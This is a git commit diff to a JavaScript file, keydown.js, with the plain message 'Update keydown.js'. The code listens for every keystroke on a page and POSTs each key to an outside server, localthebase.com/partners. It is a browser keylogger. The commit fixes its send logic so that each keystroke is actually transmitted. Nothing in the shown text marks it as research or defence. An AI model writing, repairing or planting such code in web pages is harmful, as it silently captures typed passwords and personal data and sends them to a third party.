d1b9688d9946c53034459d880f663a8ba561dab1
Makoto Kobayashi <m.kobayashi.gm@gmail.com>
2024-03-14 12:28:56 +0900

    Update keydown.js

--- keydown.js
+++ keydown.js
@@ -1,8 +1,7 @@
-var send_data = new XMLHttpRequest();
-send_data.open('POST', 'https://localthebase.com/partners');
-send_data.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
-
 document.addEventListener('keydown', (event) => {
     console.log(event.key);
+    var send_data = new XMLHttpRequest();
+    send_data.open('POST', 'https://localthebase.com/partners');
+    send_data.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
     send_data.send('keydown=' + event.key);
 });
